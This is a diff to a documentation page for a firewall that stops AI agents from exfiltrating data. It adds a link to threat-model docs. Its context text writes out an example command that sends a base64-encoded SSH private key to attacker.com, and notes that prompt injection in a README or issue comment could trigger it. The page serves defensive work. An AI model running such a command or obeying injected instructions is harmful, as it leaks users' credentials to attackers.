@@ -5,6 +5,10 @@ description: How we prevent AI agents from exfiltrating data while preserving th
 
 ## The Threat Model
 
+:::tip[Detailed Threat Model]
+For a comprehensive analysis of the firewall's threat model, including the architectural evolution after removing Docker-in-Docker support in PR #205, see the [Threat Modeling Documentation](https://github.com/githubnext/gh-aw-firewall/blob/main/docs/threat-model.md).
+:::
+
 Give an AI agent the ability to execute code, and you've implicitly given it network access. A single command—`curl https://attacker.com?secret=$(cat ~/.ssh/id_rsa | base64)`—is all it takes to exfiltrate credentials, source code, or conversation history. The prompt injection that triggers this could be hiding in a README, an issue comment, or user input the agent processes.
 
 We can't prevent agents from *trying* to reach the network. We can, however, ensure those attempts fail for unauthorized destinations while legitimate work continues unimpeded.
